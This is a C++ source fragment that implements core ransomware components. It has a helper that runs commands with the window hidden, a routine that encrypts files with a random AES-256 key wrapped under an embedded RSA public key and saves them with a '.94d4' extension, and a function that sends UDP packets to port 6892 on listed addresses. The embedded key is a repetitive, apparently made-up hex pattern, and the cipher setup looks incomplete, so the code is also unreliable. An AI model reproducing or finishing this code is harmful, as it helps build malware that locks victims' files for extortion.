// A function to create a file with a given name and content
void create_file(string name, string content) {
    ofstream file(name);
    file << content;
    file.close();
}

// A function to run a command and hide the console window
void run_command(string command) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcess(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

// A function to encrypt a file using AES-256 and RSA
void encrypt_file(string filename) {
    // Generate a random AES key and IV
    AutoSeededRandomPool prng;
    SecByteBlock key(AES::MAX_KEYLENGTH);
    prng.GenerateBlock(key, key.size());
    SecByteBlock iv(AES::BLOCKSIZE);
    prng.GenerateBlock(iv, iv.size());

    // Encrypt the AES key using RSA public key
    string rsa_pub = "30819F300D06092A864886F70D010101050003818D0030818902818100B8C9E8E3C7B6A1E7B5C4F0E2B9C4A9A6D3F5F0B7B9C2C4E8F3D1E0A6A5C3F4E1D0B9A8C2E3D1F0A9B8C3E2D1F0B9A8C3E2D1F0A9B8C3E2D1F0B9A8C3E2D1F0A9B8C3E2D1F0B9A8C3E2D1F0A9B8C3E2D1F0B9A8C3E2D1F0A9B8C3E2D1F0B9A8C3E2D1F00203010001";
    HexDecoder decoder;
    decoder.Put((byte*)rsa_pub.data(), rsa_pub.size());
    decoder.MessageEnd();
    RSA::PublicKey rsa_key;
    rsa_key.Load(decoder);
    RSAES_OAEP_SHA_Encryptor e(rsa_key);
    string encrypted_key;
    StringSource ss(key.data(), key.size(), true,
        new PK_EncryptorFilter(prng, e,
            new StringSink(encrypted_key)
        )
    );

    // Encrypt the file content using AES key and IV
    string encrypted_content;
    FileSource fs(filename.c_str(), true,
        new StreamTransformationFilter(
            AES::Encryption(key.data(), key.size(), iv.data()),
            new StringSink(encrypted_content)
        )
    );

    // Save the encrypted key and content to a new file with .94d4 extension
    string new_filename = filename + ".94d4";
    ofstream new_file(new_filename, ios::binary);
    new_file.write(encrypted_key.data(), encrypted_key.size());
    new_file.write(encrypted_content.data(), encrypted_content.size());
    new_file.close();

}

// A function to create UDP traffic on port 6892 to given addresses
void create_traffic(vector<string> addresses) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    for (string address : addresses) {
        sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(6892);
        dest.sin_addr.s_addr = inet_addr(address.c_str());
        sendto(sock, "Hello", 5, 0, (sockaddr*)&dest, sizeof(dest));
        Sleep(1000);
    }

    closesocket(sock);
}

